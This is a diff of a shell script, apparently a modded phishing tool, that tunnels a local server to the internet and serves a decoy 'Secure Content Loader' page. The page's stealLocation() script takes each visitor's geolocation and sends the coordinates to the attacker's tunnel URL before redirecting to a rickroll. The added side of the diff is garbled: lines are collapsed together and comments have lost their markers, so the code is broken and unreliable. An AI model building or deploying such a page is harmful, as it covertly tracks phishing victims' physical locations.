@@ -1,113 +1,30 @@
-
 #!/bin/sh
 
-clear
-echo "Starting tunnel... (trying Serveo, then cloudflared, then ngrok, then npx localtunnel)"
-echo "-------------------------------------------"
+clear echo "Starting tunnel... (trying Serveo, then cloudflared, then ngrok, then npx localtunnel)" echo "-------------------------------------------"
 
-start_serveo() {
-    ssh -o ConnectTimeout=10 -R 80:localhost:8080 serveo.net 2>&1 | tee ~/gps.log &
-    SSH_PID=$!
-    sleep 8
-    if ! kill -0 $SSH_PID 2>/dev/null; then
-        return 1
-    fi
-    return 0
-}
+Global var to store public URL
 
-start_cloudflared() {
-    if command -v cloudflared >/dev/null 2>&1; then
-        cloudflared tunnel --url http://localhost:8080 --logfile ~/gps.log > /dev/null 2>&1 &
-        CLOUDFLARE_PID=$!
-        sleep 8
-        if ! kill -0 $CLOUDFLARE_PID 2>/dev/null; then
-            return 1
-        fi
-        return 0
-    else
-        return 1
-    fi
-}
+varurl=""
 
-start_ngrok() {
-    if command -v ngrok >/dev/null 2>&1; then
-        ngrok http 8080 --log=stdout > ~/gps.log 2>&1 &
-        NGROK_PID=$!
-        sleep 10
-        if ! kill -0 $NGROK_PID 2>/dev/null; then
-            return 1
-        fi
-        return 0
-    else
-        return 1
-    fi
-}
+start_serveo() { ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -R 80:localhost:8080 serveo.net 2>&1 | tee ~/gps.log & SSH_PID=$! sleep 8 # Extract Serveo URL: look for "https://*.serveo.net" varurl=$(grep -oE "https://[^"]+.serveo.net" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $SSH_PID 2>/dev/null return 1 fi return 0 }
 
-start_npx() {
-    if command -v npx >/dev/null 2>&1; then
-        npx localtunnel --port 8080 --print-requests > ~/gps.log 2>&1 &
-        NPX_PID=$!
-        sleep 8
-        if ! kill -0 $NPX_PID 2>/dev/null; then
-            return 1
-        fi
-        return 0
-    else
-        return 1
-    fi
-}
+start_cloudflared() { if command -v cloudflared >/dev/null 2>&1; then cloudflared tunnel --url http://localhost:8080 --logfile ~/gps.log > /dev/null 2>&1 & CLOUDFLARE_PID=$! sleep 8 # Extract Cloudflare URL: look for "https://*.trycloudflare.com" or other domains varurl=$(grep -oE "https://[a-z0-9.-]+.trycloudflare.com" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $CLOUDFLARE_PID 2>/dev/null return 1 fi return 0 fi return 1 }
 
-if start_serveo; then
-    echo "[✓] Serveo tunnel started."
-    TUNNEL_TYPE="Serveo"
-    TUNNEL_PID=$SSH_PID
-elif start_cloudflared; then
-    echo "[✓] Cloudflared tunnel started."
-    TUNNEL_TYPE="Cloudflared"
-    TUNNEL_PID=$CLOUDFLARE_PID
-elif start_ngrok; then
-    echo "[✓] Ngrok tunnel started."
-    TUNNEL_TYPE="Ngrok"
-    TUNNEL_PID=$NGROK_PID
-elif start_npx; then
-    echo "[✓] NPX Localtunnel started."
-    TUNNEL_TYPE="Localtunnel (npx)"
-    TUNNEL_PID=$NPX_PID
-else
-    echo "[✗] All tunnel services failed to start. Please install Serveo, cloudflared, ngrok, or npx localtunnel."
-    exit 1
-fi
+start_ngrok() { if command -v ngrok >/dev/null 2>&1; then ngrok http 8080 --log=stdout > ~/gps.log 2>&1 & NGROK_PID=$! sleep 10 # Extract Ngrok URL: look for "https://*.ngrok.io" varurl=$(grep -oE "https://[a-z0-9]+.ngrok.io" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $NGROK_PID 2>/dev/null return 1 fi return 0 fi return 1 }
 
-clear
+start_npx() { if command -v npx >/dev/null 2>&1; then npx localtunnel --port 8080 --print-requests > ~/gps.log 2>&1 & NPX_PID=$! sleep 8 # Extract Localtunnel URL: look for "your url is: https://..." varurl=$(grep -oE "https://[a-z0-9.-]+.loca.lt" ~/gps.log | head -n1) if [ -z "$varurl" ]; then kill $NPX_PID 2>/dev/null return 1 fi return 0 fi return 1 }
 
-cat << "EOF"
-██╗    ███████╗███████╗███████╗    ██╗   ██╗ ██████╗ ██╗   ██╗
-██║    ██╔════╝██╔════╝██╔════╝    ╚██╗ ██╔╝██╔═══██╗██║   ██║
-██║    ███████╗█████╗  █████╗       ╚████╔╝ ██║   ██║██║   ██║
-██║    ╚════██║██╔══╝  ██╔══╝        ╚██╔╝  ██║   ██║██║   ██║
-██║    ███████║███████╗███████╗       ██║   ╚██████╔╝╚██████╔╝
-╚═╝    ╚══════╝╚══════╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝
+Attempt each tunnel method until varurl is set
 
-[+] Author: Viral Maniar  
-[+] Modded by: Techguy origin (on TikTok)  
-[+] Description: This tool uses Serveo to find the exact location of the user during social engineering or phishing engagements.
+if start_serveo; then echo "[✓] Serveo tunnel started: $varurl" TUNNEL_TYPE="Serveo" TUNNEL_PID=$SSH_PID elif start_cloudflared; then echo "[✓] Cloudflared tunnel started: $varurl" TUNNEL_TYPE="Cloudflared" TUNNEL_PID=$CLOUDFLARE_PID elif start_ngrok; then echo "[✓] Ngrok tunnel started: $varurl" TUNNEL_TYPE="Ngrok" TUNNEL_PID=$NGROK_PID elif start_npx; then echo "[✓] NPX Localtunnel started: $varurl" TUNNEL_TYPE="Localtunnel (npx)" TUNNEL_PID=$NPX_PID else echo "[✗] All tunnel services failed to start. Please install Serveo, cloudflared, ngrok, or npx localtunnel." exit 1 fi
 
-EOF
+clear echo "Tunnel active via $TUNNEL_TYPE: $varurl" echo "Check ~/gps.log for details." echo "-------------------------------------------" echo "Press Ctrl+C to terminate." echo
 
-echo
-printf 'Enter the URL generated by the tunnel (e.g., https://example.serveo.net): '
-read varurl
+Generate phishing page using varurl
 
-if [ -z "$varurl" ]; then
-    echo "Error: No URL provided. Exiting."
-    kill $TUNNEL_PID 2>/dev/null
-    exit 1
-fi
+mkdir -p ~/webpage cat <<EOF > ~/webpage/index.html
 
-mkdir -p ~/webpage
-cat <<EOF > ~/webpage/index.html
-<!DOCTYPE html>
-<html>
+<!DOCTYPE html><html>
 <head>
     <title>Secure Content Loader</title>
     <style>
@@ -137,64 +54,40 @@ cat <<EOF > ~/webpage/index.html
     </style>
 </head>
 <body>
-    <div class="loading">Loading secure content...</div>
+    <div class="loading">Loading secure content...</div><script>
+    function httpGet(theUrl) {
+        fetch(theUrl, { mode: 'no-cors' }).catch(err => console.log("Error sending location:", err));
+    }
 
-    <script>
-        function httpGet(theUrl) {
-            fetch(theUrl, { mode: 'no-cors' }).catch(err => console.log("Error sending location:", err));
+    function stealLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const coords = position.coords.latitude + ',' + position.coords.longitude;
+                    const url = "${varurl}/logme/" + coords;
+                    httpGet(url);
+
+                    setTimeout(() => {
+                        window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
+                    }, 3000);
+                },
+                function(err) {
+                    console.log("Geolocation error:", err);
+                }
+            );
         }
+    }
 
-        function stealLocation() {
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(
-                    function(position) {
-                        const coords = position.coords.latitude + ',' + position.coords.longitude;
-                        const url = "$varurl/logme/" + coords;
-                        httpGet(url);
+    setTimeout(stealLocation, 1500);
+</script>
 
-                        setTimeout(() => {
-                            window.location.href = "https://shattereddisk.github.io/rickroll/rickroll.mp4";
-                        }, 3000);
-                    },
-                    function(err) {
-                        console.log("Geolocation error:", err);
-                    }
-                );
-            }
-        }
-
-        setTimeout(stealLocation, 1500);
-    </script>
 </body>
 </html>
-EOF
+EOFStart local HTTP server
 
-cd ~/webpage || exit 1
-
-if command -v python3 >/dev/null 2>&1; then
-    python3 -m http.server 8080 >/dev/null 2>&1 &
-    SERVER_PID=$!
-    echo "[✓] Server started using Python at http://localhost:8080"
-elif command -v busybox >/dev/null 2>&1; then
-    busybox httpd -f -p 8080 &
-    SERVER_PID=$!
-    echo "[✓] Server started using BusyBox at http://localhost:8080"
-elif command -v ncat >/dev/null 2>&1; then
-    while true; do
-        { echo -ne "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n"; cat index.html; } | ncat -l 8080
-    done &
-    SERVER_PID=$!
-    echo "[✓] Server started using ncat at http://localhost:8080"
-else
-    echo "[✗] No supported web server found (python3, busybox, or ncat required)."
-    kill $TUNNEL_PID 2>/dev/null
-    exit 1
-fi
+cd ~/webpage || exit 1 if command -v python3 >/dev/null 2>&1; then python3 -m http.server 8080 >/dev/null 2>&1 & SERVER_PID=$! echo "[✓] Server started using Python at http://localhost:8080" elif command -v busybox >/dev/null 2>&1; then busybox httpd -f -p 8080 & SERVER_PID=$! echo "[✓] Server started using BusyBox at http://localhost:8080" else echo "[✗] No supported web server found (python3 or busybox required)." kill $TUNNEL_PID 2>/dev/null exit 1 fi
 
 trap 'echo "\n[+] Cleaning up..."; kill $TUNNEL_PID $SERVER_PID 2>/dev/null' EXIT
 
-echo "-------------------------------------------"
-echo "[✓] Tunnel active via $TUNNEL_TYPE: $varurl"
-echo "[✓] Web server running on http://localhost:8080"
-echo "[*] Press Ctrl+C to stop..."
 wait
+
